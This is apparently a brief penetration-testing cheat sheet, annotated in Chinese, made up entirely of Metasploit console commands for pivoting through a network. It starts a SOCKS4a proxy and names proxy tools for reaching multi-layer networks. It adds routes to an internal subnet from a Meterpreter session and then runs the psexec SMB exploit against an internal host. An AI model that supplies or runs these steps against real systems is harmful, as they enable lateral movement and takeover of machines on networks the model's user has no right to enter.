	>use auxiliary/server/socks4a
	>set srvhost 0.0.0.0
	>set srvport 1080
	>run
	多层网络
	再多配置个端口
	Win: Proxifier& Sockscap64
	Linux: proxychains& 浏览器
	&
	meterpreter > ipconfig 
	IP Address : 10.1.13.3 
	meterpreter > run autoroute -s 10.1.13.0/24 
	meterpreter > run autoroute -p 
	10.1.13.0 255.255.255.0 Session 1 
	meterpreter > bg 
	msf auxiliary(tcp) > use exploit/windows/smb/psexec 
	msf exploit(psexec) > set RHOST 10.1.13.2 
	msf exploit(psexec) > exploit 
